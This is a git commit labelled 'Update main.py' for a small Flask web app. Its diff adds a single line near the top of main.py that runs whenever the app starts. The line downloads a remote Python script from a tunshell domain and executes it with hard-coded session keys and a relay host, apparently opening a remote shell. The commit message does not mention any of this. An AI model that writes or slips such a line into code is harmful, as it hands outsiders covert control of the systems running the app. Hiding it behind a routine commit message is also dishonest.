cff3bb2b3815d32c92dfce3460e77ba2633d725e
kaixianglin13-jpg <kaixianglin13@gmail.com>
2026-06-01 12:21:37 +0800

    Update main.py

--- main.py
+++ main.py
@@ -2,6 +2,8 @@ from flask import Flask, render_template
 
 app = Flask(__name__)
 
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","pFGejey77ySXqsUUDMtsGO","8ILdYVjgKgzzKd9dEZH1iO","au.relay.tunshell.com"]})
+
 @app.route('/')
 def index():
   return render_template('index.html')
